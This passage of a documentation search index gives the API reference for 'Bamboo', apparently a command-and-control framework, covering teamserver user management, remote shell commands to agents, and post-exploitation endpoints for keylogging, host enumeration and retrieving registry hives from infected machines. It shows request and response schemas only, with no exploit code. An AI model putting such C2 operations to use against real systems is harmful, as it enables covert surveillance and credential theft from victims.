Agent.</p>"},{"location":"API_Reference/handler_func.html#request-schema_4","title":"Request schema","text":""},{"location":"API_Reference/handler_func.html#request-body_4","title":"Request body","text":"Field Type Description username String Username of user agent_identifier String Identifier of Bamboo Agent"},{"location":"API_Reference/handler_func.html#request-example_4","title":"Request example","text":"<pre><code>{\n    \"username\": \"bambooUser\",\n    \"agent_identifier\": \"5zrire9a\"\n}\n</code></pre>"},{"location":"API_Reference/handler_func.html#response-schema_4","title":"Response schema","text":"Status Code Schema Description <code>200</code> {\"status\": \"alive\"} Retrieved information and Bamboo is 'alive' <code>200</code> {\"status\": \"dead\"} Retrieved information and Bamboo is 'dead' <code>404</code> {\"status\": \"fail\"} Invalid Body <code>500</code> {\"status\": \"fail\"} Something went wrong"},{"location":"API_Reference/handler_func.html#response-example_4","title":"Response example","text":"<pre><code>{\n    \"status\": \"alive\"\n}\n</code></pre>"},{"location":"API_Reference/handler_func.html#view-all-users","title":"View all Users","text":"<p>Retrieve all users in Bamboo Teamserver</p>"},{"location":"API_Reference/handler_func.html#endpoint_5","title":"Endpoint","text":"<pre><code>POST /handler_func/handler/view_users\n</code></pre>"},{"location":"API_Reference/handler_func.html#description_5","title":"Description","text":"<p>This endpoint is called when a Bamboo Client user wants to view all registered users in Bamboo Teamserver using the {command <code>users</code>}. Using the <code>model view_users</code>, Bamboo Teamserver will be able to extract the username and status of the registered users.</p>"},{"location":"API_Reference/handler_func.html#request-schema_5","title":"Request schema","text":""},{"location":"API_Reference/handler_func.html#request-body_5","title":"Request body","text":"Field Type Description username String Username of user"},{"location":"API_Reference/handler_func.html#request-example_5","title":"Request example","text":"<pre><code>{\n    \"username\": \"bambooUser\"\n}\n</code></pre>"},{"location":"API_Reference/handler_func.html#response-schema_5","title":"Response schema","text":"Status Code Schema Description <code>200</code> {\"status\": \"success\", \"user_data\": user_data} Successfully retrieved all registered user information <code>404</code> {\"status\": \"fail\"} Invalid Body <code>500</code> {\"status\": \"fail\"} Something went wrong"},{"location":"API_Reference/handler_func.html#response-example_5","title":"Response example","text":"<pre><code>{\n    \"status\": \"success\",\n    \"user_data\": &lt;list of usernames and status&gt;\n}\n</code></pre>"},{"location":"API_Reference/handler_func.html#add-new-users","title":"Add new Users","text":"<p>Resgiter new users into the Bamboo Teamserver</p>"},{"location":"API_Reference/handler_func.html#endpoint_6","title":"Endpoint","text":"<pre><code>POST /handler_func/handler/register_user\n</code></pre>"},{"location":"API_Reference/handler_func.html#description_6","title":"Description","text":"<p>This endpoint is called when a Bamboo Client user wants to register a new user into Bamboo Teamserver using the {command <code>register</code>}. Using the <code>model find_one</code>, Bamboo Teamserver will be able to determine if there will be any duplicates of username. After that, it will use the <code>model register_user</code> to add the information of the new user into the database.</p>"},{"location":"API_Reference/handler_func.html#request-schema_6","title":"Request schema","text":""},{"location":"API_Reference/handler_func.html#request-body_6","title":"Request body","text":"Field Type Description username String Username of user new_username String New user username new_password String New user password"},{"location":"API_Reference/handler_func.html#request-example_6","title":"Request example","text":"<pre><code>{\n    \"username\": \"bambooUser\",\n    \"new_username\": \"bambooUserTwo\",\n    \"new_password\": \"ilovePandas213\"\n}\n</code></pre>"},{"location":"API_Reference/handler_func.html#response-schema_6","title":"Response schema","text":"Status Code Schema Description <code>200</code> {\"status\": \"success\"} Successfully registered a new user <code>404</code> {\"status\": \"fail\"} Invalid Body <code>422</code> {\"status\": \"duplicate\"} Username already exist <code>500</code> {\"status\": \"fail\"} Something went wrong"},{"location":"API_Reference/handler_func.html#response-example_6","title":"Response example","text":"<pre><code>{\n    \"status\": \"success\",\n}\n</code></pre>"},{"location":"API_Reference/handler_func.html#remove-users","title":"Remove Users","text":"<p>Remove Bamboo Client users from Bamboo Teamserver</p>"},{"location":"API_Reference/handler_func.html#endpoint_7","title":"Endpoint","text":"<pre><code>POST /handler_func/handler/delete_user\n</code></pre>"},{"location":"API_Reference/handler_func.html#description_7","title":"Description","text":"<p>This endpoint is called when a Bamboo Client user wants to remove a user from Bamboo Teamserver using the {command <code>remove [username]</code>}. Using the <code>model delete_user</code>, Bamboo Teamserver will be able to delete the specified user.</p>"},{"location":"API_Reference/handler_func.html#request-schema_7","title":"Request schema","text":""},{"location":"API_Reference/handler_func.html#request-body_7","title":"Request body","text":"Field Type Description username String Username of user del_username String Username to remove"},{"location":"API_Reference/handler_func.html#request-example_7","title":"Request example","text":"<pre><code>{\n    \"username\": \"bambooUser\",\n    \"del_username\": \"bambooUserTwo\"\n}\n</code></pre>"},{"location":"API_Reference/handler_func.html#response-schema_7","title":"Response schema","text":"Status Code Schema Description <code>200</code> {\"status\": \"success\"} Successfully deleted information of specified username <code>404</code> {\"status\": \"fail\"} Username not found <code>404</code> {\"status\": \"fail\"} Invalid Body <code>500</code> {\"status\": \"fail\"} Something went wrong"},{"location":"API_Reference/handler_func.html#response-example_7","title":"Response example","text":"<pre><code>{\n    \"status\": \"success\"\n}\n</code></pre>"},{"location":"API_Reference/handler_func.html#command-prompt","title":"Command Prompt","text":"<p>Sends commands to Bamboo Agent</p>"},{"location":"API_Reference/handler_func.html#endpoint_8","title":"Endpoint","text":"<pre><code>POST /handler_func/cmd\n</code></pre>"},{"location":"API_Reference/handler_func.html#description_8","title":"Description","text":"<p>This endpoint is called when a Bamboo Client user wants to start a shell session with a Bamboo Agent using the {command <code>cmd</code>}. Bamboo Teamserver will use WebSocket to broadcast the command to the specified Bamboo Agent.</p>"},{"location":"API_Reference/handler_func.html#request-schema_8","title":"Request schema","text":""},{"location":"API_Reference/handler_func.html#request-body_8","title":"Request body","text":"Field Type Description username String Username of user agent_identifier String Identifier of Bamboo Agent command String Command to forward to Bamboo Agent"},{"location":"API_Reference/handler_func.html#request-example_8","title":"Request example","text":"<pre><code>{\n    \"username\": \"bambooUser\",\n    \"agent_identifier\": \"5zrire9a\",\n    \"command\": \"whoami\"\n}\n</code></pre>"},{"location":"API_Reference/handler_func.html#response-schema_8","title":"Response schema","text":"Status Code Schema Description <code>200</code> {\"status\": \"success\"} Successfully broadcast command to Bamboo Agent <code>400</code> {\"status\": \"Agent is not connected to C2 WS\"} Failed to broadcast to Bamboo Agent <code>404</code> {\"status\": \"fail\"} Invalid Body"},{"location":"API_Reference/handler_func.html#response-example_8","title":"Response example","text":"<pre><code>{\n    \"status\": \"success\"\n}\n</code></pre>"},{"location":"API_Reference/handler_func.html#websocket-schema","title":"WebSocket schema","text":""},{"location":"API_Reference/handler_func.html#websocket-body","title":"WebSocket body","text":"Field Type Description command String cmd cmd String Command that Bamboo Client user input"},{"location":"API_Reference/handler_func.html#websocket-example","title":"WebSocket example","text":"<pre><code>{\n    \"command\": \"cmd\",\n    \"cmd\": \"whoami\"\n}\n</code></pre>"},{"location":"API_Reference/handler_func.html#command-output","title":"Command Output","text":"<p>Receives reponse from Bamboo Agent during command</p>"},{"location":"API_Reference/handler_func.html#endpoint_9","title":"Endpoint","text":"<pre><code>POST /handler_func/handler_output\n</code></pre>"},{"location":"API_Reference/handler_func.html#description_9","title":"Description","text":"<p>After the Bamboo Client sends a command over to a Bamboo Agent using the {command <code>cmd</code>}, the Bamboo Client will request for this endpoint and wait for a response. To prevent users for waiting indefinitely, there is a timeout mechanism. Every 10 second, Bamboo Teamserver will check if the command response have been sent every second. If none have been sent, the user will get timeout.</p>"},{"location":"API_Reference/handler_func.html#request-schema_9","title":"Request schema","text":""},{"location":"API_Reference/handler_func.html#request-body_9","title":"Request body","text":"Field Type Description username String Username of user agent_identifier String Identifier of Bamboo Agent"},{"location":"API_Reference/handler_func.html#request-example_9","title":"Request example","text":"<pre><code>{\n    \"username\": \"bambooUser\",\n    \"agent_identifier\": \"5zrire9a\"\n}\n</code></pre>"},{"location":"API_Reference/handler_func.html#response-schema_9","title":"Response schema","text":"Status Code Schema Description <code>200</code> {agent_identifier: response} Receive response <code>404</code> {\"status\": \"fail\"} Invalid Body <code>408</code> {\"status\": \"timeout\"} User timeout"},{"location":"API_Reference/handler_func.html#response-example_9","title":"Response example","text":"<pre><code>{\n    \"5zrire9a\": \"bambooMachine\\panda\"\n}\n</code></pre>"},{"location":"API_Reference/handler_func.html#teamchat","title":"Teamchat","text":"<p>Broadcast teamchat message to all other Bamboo Client</p>"},{"location":"API_Reference/handler_func.html#endpoint_10","title":"Endpoint","text":"<pre><code>POST /handler_func/teamchat\n</code></pre>"},{"location":"API_Reference/handler_func.html#description_10","title":"Description","text":"<p>This endpoint is called everytime a Bamboo Client user sends a message in the Teamchat using the {command <code>chat</code>} in CLI or using the <code>TEAMCHAT tab</code> in GUI. Bamboo Teamserver will relay the message from the Bamboo Client to all Bamboo Client using WebSocket broadcast.</p>"},{"location":"API_Reference/handler_func.html#request-schema_10","title":"Request schema","text":""},{"location":"API_Reference/handler_func.html#request-body_10","title":"Request body","text":"Field Type Description username String Username of user message String Message sent into teamchat"},{"location":"API_Reference/handler_func.html#request-example_10","title":"Request example","text":"<pre><code>{\n    \"username\": \"bambooUser\",\n    \"message\": \"hello everyone\"\n}\n</code></pre>"},{"location":"API_Reference/handler_func.html#response-schema_10","title":"Response schema","text":"Status Code Schema Description <code>200</code> {\"status\": \"success\"} Successfully broadcast command to Bamboo Agent <code>400</code> {\"status\": \"Agent is not connected to C2 WS\"} Failed to broadcast to Bamboo Agent <code>404</code> {\"status\": \"fail\"} Invalid Body"},{"location":"API_Reference/handler_func.html#response-example_10","title":"Response example","text":"<pre><code>{\n    \"status\": \"success\"\n}\n</code></pre>"},{"location":"API_Reference/handler_func.html#websocket-schema_1","title":"WebSocket schema","text":""},{"location":"API_Reference/handler_func.html#websocket-body_1","title":"WebSocket body","text":"Field Type Description chatMsg String Bamboo Client Message"},{"location":"API_Reference/handler_func.html#websocket-example_1","title":"WebSocket example","text":"<pre><code>{\n    \"chatMsg\": \"hello everyone\"\n}\n</code></pre>"},{"location":"API_Reference/postexp.html","title":"/postexp","text":""},{"location":"API_Reference/postexp.html#keylogging","title":"Keylogging","text":"<p>Start/Stop keylogging activity of specified Bamboo Agent</p>"},{"location":"API_Reference/postexp.html#endpoint","title":"Endpoint","text":"<pre><code>POST /postexp/keylog\n</code></pre>"},{"location":"API_Reference/postexp.html#description","title":"Description","text":"<p>Bamboo Client calls this endpoint when they want to start/stop keylogging activity. All activities will be recorded down into a <code>global variable: keylog_status</code>. keylog_status is a dictionary that keeps track of all keylog activity within Bamboo Teamserver. Therefore, with this global variable, Bamboo Teamserver will be able to tell if the Bamboo Client user is starting or stopping the keylogging. After Bamboo Teamserver know the action to command, a WebSocket broadcast will be made to the Bamboo Agent Specified. This command can be called by any Bamboo Agent with any privilege level.</p>"},{"location":"API_Reference/postexp.html#request-schema","title":"Request schema","text":""},{"location":"API_Reference/postexp.html#request-body","title":"Request body","text":"Field Type Description username String Username of user agent_identifier String Identifier of Bamboo Agent method String Tool used (keylog)"},{"location":"API_Reference/postexp.html#request-example","title":"Request example","text":"<pre><code>{\n    \"username\": \"bambooUser\",\n    \"agent_identifier\": \"5zrire9a\",\n    \"method\": \"keylog\"\n}\n</code></pre>"},{"location":"API_Reference/postexp.html#response-schema","title":"Response schema","text":"Status Code Schema Description <code>200</code> {\"status\": \"success\", \"action\": status} Successfully command Bamboo Agent <code>400</code> {\"status\": \"Agent is not connected to C2 WS\"} Failed to broadcast to Bamboo Agent <code>404</code> {\"status\": \"failed\"} Invalid Body"},{"location":"API_Reference/postexp.html#response-example","title":"Response example","text":"<pre><code>{\n    \"status\": \"success\",\n    \"action\": \"start\"\n}\n</code></pre>"},{"location":"API_Reference/postexp.html#websocket-schema","title":"WebSocket schema","text":""},{"location":"API_Reference/postexp.html#websocket-body","title":"WebSocket body","text":"Field Type Description command String post exploit method String Keylogging handler String User that commanded status String To start/stop keylogging"},{"location":"API_Reference/postexp.html#websocket-example","title":"WebSocket example","text":"<pre><code>{\n    \"command\": \"post exploit\",\n    \"method\": \"keylog\",\n    \"handler\": \"bambooUser\",\n    \"status\": \"start\"\n}\n</code></pre>"},{"location":"API_Reference/postexp.html#enumeration","title":"Enumeration","text":"<p>Start enumerating an infected machine</p>"},{"location":"API_Reference/postexp.html#endpoint_1","title":"Endpoint","text":"<pre><code>POST /postexp/enum\n</code></pre>"},{"location":"API_Reference/postexp.html#description_1","title":"Description","text":"<p>Bamboo Client calls this endpoint when they want to enumerate the infected machine remotely using the specified Bamboo Agent. Bamboo teamserver will send a WebSocket broadcast to the Bamboo Agent specified and command it to start enumerate the infected machine. This command can be called by any Bamboo Agent with any privilege level.</p>"},{"location":"API_Reference/postexp.html#request-schema_1","title":"Request schema","text":""},{"location":"API_Reference/postexp.html#request-body_1","title":"Request body","text":"Field Type Description username String Username of user agent_identifier String Identifier of Bamboo Agent method String Tool used (enumerate)"},{"location":"API_Reference/postexp.html#request-example_1","title":"Request example","text":"<pre><code>{\n    \"username\": \"bambooUser\",\n    \"agent_identifier\": \"5zrire9a\",\n    \"method\": \"enum\"\n}\n</code></pre>"},{"location":"API_Reference/postexp.html#response-schema_1","title":"Response schema","text":"Status Code Schema Description <code>200</code> {\"status\": \"success\"} Successfully command Bamboo Agent <code>400</code> {\"status\": \"Agent is not connected to C2 WS\"} Failed to broadcast to Bamboo Agent <code>404</code> {\"status\": \"failed\"} Invalid Body"},{"location":"API_Reference/postexp.html#response-example_1","title":"Response example","text":"<pre><code>{\n    \"status\": \"success\"\n}\n</code></pre>"},{"location":"API_Reference/postexp.html#websocket-schema_1","title":"WebSocket schema","text":""},{"location":"API_Reference/postexp.html#websocket-body_1","title":"WebSocket body","text":"Field Type Description command String post exploit method String Keylogging handler String User that commanded"},{"location":"API_Reference/postexp.html#websocket-example_1","title":"WebSocket example","text":"<pre><code>{\n    \"command\": \"post exploit\",\n    \"method\": \"enumerate\",\n    \"handler\": \"bambooUser\"\n}\n</code></pre>"},{"location":"API_Reference/postexp.html#sss_retrieve","title":"SSS_Retrieve","text":"<p>Retrieve registry hive of infected machine</p>"},{"location":"API_Reference/postexp.html#endpoint_2","title":"Endpoint","text":"<pre><code>POST /postexp/reteive\n</code></pre>"},{"location":"API_Reference/postexp.html#description_2","title":"Description","text":"<p>Bamboo Client calls this endpoint when they want to retrieve the registry hive of the infected machine remotely using the specified Bamboo Agent. This command can only be called by Bamboo Agent with <code>High</code> or <code>System</code> level privilege. If the requirements are met, Bamboo teamserver will send a WebSocket broadcast to the Bamboo Agent specified and command it to start retrieving the registry hive of the infected machine.</p>"},{"location":"API_Reference/postexp.html#request-schema_2","title":"Request schema","text":""},{"location":"API_Reference/postexp.html#request-body_2","title":"Request body","text":"Field Type Description username String Username of user agent_identifier String Identifier of Bamboo Agent method String Tool used (enumerate) priv_lvl String Privilege level of Bamboo Agent"},{"location":"API_Reference/postexp.html#request-example_2","title":"Request example","text":"<pre><code>{\n    \"username\": \"bambooUser\",\n    \"agent_identifier\": \"5zrire9a\",\n    \"method\": \"enum\",\n    \"priv_lvl\": \"System\"\n}\n</code></pre>"},{"location":"API_Reference/postexp.html#response-schema_2","title":"Response schema","text":"Status Code Schema Description <code>200</code> {\"status\": \"success\"} Successfully command Bamboo Agent <code>400</code> {\"status\": \"Agent is not connected to C2 WS\"} Failed to broadcast to Bamboo Agent <code>404</code> {\"status\": \"failed\"} Invalid Body"},{"location":"API_Reference/postexp.html#response-example_2","title":"Response example","text":"<pre><code>{\n    \"status\": \"success\"\n}\n</code></pre>"},{"location":"API_Reference/postexp.html#websocket-schema_2","title":"WebSocket schema","text":""},{"location":"API_Reference/postexp.html#websocket-body_2","title":"WebSocket body","text":"Field Type Description command String post exploit method String Keylogging handler String User that commanded"},{"location":"API_Reference/postexp.html#websocket-example_2","title":"WebSocket example","text":"<pre><code>{\n    \"command\": \"post exploit\",\n    \"method\": \"sss retrieve\",\n    \"handler\": \"bambooUser\"\n}\n</code></pre>"}]}